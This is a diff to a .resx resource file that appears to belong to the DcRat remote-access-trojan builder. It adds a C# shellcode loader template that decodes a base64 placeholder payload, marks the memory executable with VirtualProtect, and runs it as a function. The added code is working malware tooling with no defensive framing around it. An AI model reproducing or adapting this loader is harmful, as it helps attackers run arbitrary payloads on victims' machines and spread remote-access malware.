@@ -184,4 +184,52 @@
   <data name="DcRat_png" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\DcRat_png.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
+  <data name="ShellcodeLoader" xml:space="preserve">
+    <value>using System;
+using System.Runtime.InteropServices;
+
+namespace DcRat_Shellcode_Loader
+{
+    public class ShellCode
+    {
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int Run();
+
+        public static bool ShellCodeExecute(byte[] ShellCode)
+        {
+            try
+            {
+                GCHandle pinnedArray = GCHandle.Alloc(ShellCode, GCHandleType.Pinned);
+                IntPtr ptr = pinnedArray.AddrOfPinnedObject();
+                Marshal.Copy(ShellCode, 0, ptr, ShellCode.Length);
+
+                //uint flOldProtect = 0;
+                bool ChangeProtection = VirtualProtect(ptr, (UIntPtr)ShellCode.Length, 0x40, out uint flOldProtect);
+                if (!ChangeProtection)
+                {
+                    return false;
+                }
+                Run del = (Run)Marshal.GetDelegateForFunctionPointer(ptr, typeof(Run));
+                del();
+                return true;
+            }
+            catch (Exception e)
+            {
+                Console.Error.WriteLine("ShellCodeExecute exception: " + e.Message);
+            }
+            return false;
+        }
+
+        [DllImport("kernel32.dll")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        static void Main()
+        {
+            byte[] buf = Convert.FromBase64String("%shellcode%");
+
+            ShellCodeExecute(buf);
+        }
+    }
+}</value>
+  </data>
 </root>
